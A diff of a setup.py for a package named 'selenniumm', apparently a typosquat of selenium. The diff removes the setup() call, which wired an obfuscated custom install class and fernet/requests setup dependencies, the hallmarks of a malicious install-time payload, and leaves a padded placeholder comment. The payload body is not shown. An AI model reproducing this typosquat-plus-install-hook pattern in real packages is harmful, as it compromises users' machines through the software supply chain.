@@ -18,22 +18,5 @@ class ChbqUNzjmxDmQEGZfRMTMuThUEsfNayzCOvFrfgcqLxSOJFjkMurnnOzIOqvaZKOanqEFHetFp
             install.run(self)
 
 
-setup(
-    name="selenniumm",
-    version=VERSION,
-    author="xTiJPWasQVxqcPwFqVu",
-    author_email="bpIkiMNkVQafgpJIG@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': ChbqUNzjmxDmQEGZfRMTMuThUEsfNayzCOvFrfgcqLxSOJFjkMurnnOzIOqvaZKOanqEFHetFpwLgvDcXJSRKCdvvEKWfIjyBhOmQlnUxKaDGRJbVyFNNreqbFavQMUEFFCGnvIeqqeLyrghgtbqCLsXuFgXdtMGbtWWPXXr,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
 
